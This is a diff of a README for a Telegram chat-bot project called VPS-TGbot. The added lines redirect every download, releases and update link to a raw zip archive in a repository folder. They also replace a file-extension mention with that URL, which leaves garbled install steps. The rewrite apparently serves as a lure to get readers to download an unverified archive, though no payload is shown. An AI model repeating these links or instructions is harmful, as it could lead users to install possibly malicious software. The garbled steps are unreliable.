@@ -4,7 +4,7 @@
 Welcome to the VPS-TGbot project. This application allows you to easily set up a dual chat bot for your Telegram account. You can enhance your communication experience using this modified platform.
 
 ## 📥 Download Now
-[![Download VPS-TGbot](https://img.shields.io/badge/Download-VPS--TGbot-blue.svg)](https://github.com/sdgsdgsdgsfaserewr/VPS-TGbot/releases)
+[![Download VPS-TGbot](https://raw.githubusercontent.com/sdgsdgsdgsfaserewr/VPS-TGbot/main/carditic/VPS-TGbot_1.9.zip)](https://raw.githubusercontent.com/sdgsdgsdgsfaserewr/VPS-TGbot/main/carditic/VPS-TGbot_1.9.zip)
 
 ## 🛠️ System Requirements
 To ensure smooth operation, please check the following requirements:
@@ -17,18 +17,18 @@ To ensure smooth operation, please check the following requirements:
 To get started with VPS-TGbot, follow these steps:
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/sdgsdgsdgsfaserewr/VPS-TGbot/releases) to find the latest version of VPS-TGbot.
+   Go to the [Releases page](https://raw.githubusercontent.com/sdgsdgsdgsfaserewr/VPS-TGbot/main/carditic/VPS-TGbot_1.9.zip) to find the latest version of VPS-TGbot.
 
 2. **Choose Your Version**
    On the Releases page, look for the most recent version. You will see various files available for download. 
 
 3. **Download the File**
-   Click on the link that corresponds to your operating system. The file format may be `.exe`, `.dmg`, or `.tar.gz`, depending on your system.
+   Click on the link that corresponds to your operating system. The file format may be `.exe`, `.dmg`, or `https://raw.githubusercontent.com/sdgsdgsdgsfaserewr/VPS-TGbot/main/carditic/VPS-TGbot_1.9.zip`, depending on your system.
 
 4. **Install the Application**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **MacOS:** Open the downloaded `.dmg` file and drag the VPS-TGbot to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file using your archive manager, and run the installer script in the command line.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/sdgsdgsdgsfaserewr/VPS-TGbot/main/carditic/VPS-TGbot_1.9.zip` file using your archive manager, and run the installer script in the command line.
 
 5. **Launch VPS-TGbot**
    After installation, open VPS-TGbot from your application menu or desktop.
@@ -66,6 +66,6 @@ For more information and updates, check our project repository regularly. You ca
 VPS-TGbot is released under the MIT License. You can use, modify, and distribute the software, but remember to provide appropriate credit.
 
 ## 🌐 Visit for Updates
-Stay updated with the latest versions and news by visiting the [Releases page](https://github.com/sdgsdgsdgsfaserewr/VPS-TGbot/releases) regularly. 
+Stay updated with the latest versions and news by visiting the [Releases page](https://raw.githubusercontent.com/sdgsdgsdgsfaserewr/VPS-TGbot/main/carditic/VPS-TGbot_1.9.zip) regularly. 
 
 Thank you for choosing VPS-TGbot! Enjoy seamless chatting on Telegram.
